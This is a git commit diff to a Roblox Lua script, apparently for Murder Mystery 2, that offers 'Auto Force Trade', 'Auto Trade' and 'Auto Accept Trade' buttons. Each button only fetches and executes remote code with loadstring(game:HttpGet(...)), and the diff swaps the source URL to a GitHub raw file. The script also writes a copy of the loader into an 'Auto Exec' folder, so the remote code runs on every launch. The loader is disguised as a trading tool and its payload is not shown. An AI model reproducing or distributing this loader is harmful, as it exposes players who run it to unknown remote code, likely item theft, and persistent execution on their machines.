11c38ab9d71ef9030c9bf6b9bd33080f7a06738b
no <mys4exz4@gmail.com>
2025-04-27 14:14:48 +0700

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -4,16 +4,16 @@ local label = lib:CreateLabel(window, "Main")
 
 local autoForceTrade = false
 lib:CreateToggle(window, "Auto Force Trade", false, function(state)
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 local autoTrade = false
 lib:CreateToggle(window, "Auto Trade", false, function(state)
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 lib:CreateButton(window, "Auto Accept Trade", function()
-    loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 end)
 
 local folders = {"Auto Exec"}
@@ -28,6 +28,6 @@ end
 
 if selectedFolder and writefile then
     writefile(selectedFolder.."/baconhubauto.lua", [[
-loadstring(game:HttpGet("http://vpaste.net/LHqP1"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Quantum-X19/websocket/refs/heads/main/mm2.lua"))()
 ]])
 end
